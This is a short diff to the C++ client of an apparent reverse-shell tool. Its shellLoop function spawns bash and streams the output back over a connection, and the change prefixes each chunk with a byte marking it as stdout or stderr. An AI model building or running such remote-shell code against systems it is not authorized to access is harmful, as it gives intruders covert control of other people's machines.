@@ -305,7 +305,7 @@ void reverseshell::ClientPrivateMembers::shellLoop()
 	{
 		const redi::pstreams::pmode mode = redi::pstreams::pstdin | redi::pstreams::pstdout | redi::pstreams::pstderr;
 		redi::pstream shellStream("bash", mode);
-		std::array<char,1024> buffer;
+		std::array<char,1024> buffer; // First byte is Client::MessageType, then the message data
 		std::streamsize n;
 		bool errorFinished=false;
 		bool outFinished=false;
@@ -317,7 +317,8 @@ void reverseshell::ClientPrivateMembers::shellLoop()
 			//
 			if (!errorFinished)
 			{
-				while( (n = shellStream.err().readsome( buffer.data(), buffer.size() )) > 0 ) send( buffer.data(), n );
+				buffer[0]=static_cast<char>( Client::MessageType::StdErr );
+				while( (n = shellStream.err().readsome( &buffer[1], buffer.size()-1 )) > 0 ) send( buffer.data(), n+1 );
 				if( shellStream.eof() )
 				{
 					errorFinished = true;
@@ -331,7 +332,8 @@ void reverseshell::ClientPrivateMembers::shellLoop()
 			//
 			if (!outFinished)
 			{
-				while( (n = shellStream.out().readsome( buffer.data(), buffer.size() )) > 0 ) send( buffer.data(), n );
+				buffer[0]=static_cast<char>( Client::MessageType::StdOut );
+				while( (n = shellStream.out().readsome( &buffer[1], buffer.size()-1 )) > 0 ) send( buffer.data(), n+1 );
 				if( shellStream.eof() )
 				{
 					outFinished = true;
